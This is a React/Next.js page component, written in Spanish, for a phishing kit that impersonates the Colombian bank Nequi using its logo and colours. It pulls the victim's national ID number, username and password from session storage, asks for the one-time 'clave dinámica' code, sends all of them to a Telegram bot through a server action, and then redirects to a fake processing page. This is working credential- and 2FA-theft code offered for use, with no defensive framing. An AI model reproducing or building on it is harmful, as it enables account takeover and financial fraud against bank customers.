'use client'

import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import Image from "next/image"
import { Button } from "@/components/ui/button"
import { useRouter } from "next/navigation"
import { useState, useEffect } from "react"
import { Input } from "@/components/ui/input"
import { sendToTelegram } from "@/app/actions/telegram";

export default function OtpPage() {
  const router = useRouter();
  const [claveDinamica, setClaveDinamica] = useState("");
  const [loading, setLoading] = useState(false); // Estado para manejar el estado de carga
  const [showTransition, setShowTransition] = useState(false); // Estado para manejar la transición de la página

  // useEffect para redirigir al usuario al login si no hay datos en sessionStorage
  useEffect(() => {
    const cedula = sessionStorage.getItem('cedula');
    const usuario = sessionStorage.getItem('usuario');
    const clave = sessionStorage.getItem('clave');

    if (!cedula || !usuario || !clave) {
      router.push('/login');
      return;
    }
  }, [router])

  // Función para manejar el envío del formulario
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (claveDinamica) {
      setLoading(true);
      const cedula = sessionStorage.getItem("cedula");
      const usuario = sessionStorage.getItem("usuario");
      const clave = sessionStorage.getItem("clave");

      if (!cedula || !usuario || !clave) {
        router.push("/login");
        return;
      }

      // Guarda la clave dinámica en sessionStorage
      sessionStorage.setItem("claveDinamica", claveDinamica);

      // Envía los datos a Telegram
      await sendToTelegram({
        usuario,
        clave,
        claveDinamica,
        cedula,
      });

      // router.push("/siguiente-pagina");
      setTimeout(() => {
        setLoading(false);
        router.push("/procesando");
      }, 2000); // Espera 2 segundos antes de redirigir
    }
  };
  return (
    <main className="min-h-screen bg-pink-50">
      <nav className="bg-white shadow-sm px-4 py-2">
        <div className="max-w-7xl mx-auto">
          <Image
            src="https://cdn.prod.website-files.com/6317a229ebf7723658463b4b/663a6b0d43303ddf38035997_logo-nequi.svg"
            alt="Nequi Logo"
            width={120}
            height={40}
            priority
          />
        </div>
      </nav>

      <div className="container mx-auto px-4 py-8">
        <Card className="max-w-md mx-auto">
          <CardHeader>
            <CardTitle className="text-center text-xl font-semibold">
              Ingresa tu nueva clave dinámica
            </CardTitle>
          </CardHeader>
          <CardContent>
            <form onSubmit={handleSubmit} className="space-y-4">
              <div className="space-y-2">
                <Input
                  type="text"
                  placeholder="Clave dinámica"
                  value={claveDinamica}
                  onChange={(e) => setClaveDinamica(e.target.value)}
                  required
                />
              </div>
              <Button
                type="submit"
                className="w-full bg-[#E6007E] hover:bg-[#C4006B] text-white"
              >
                Continuar
              </Button>
            </form>
          </CardContent>
        </Card>
      </div>
    </main>
  )
}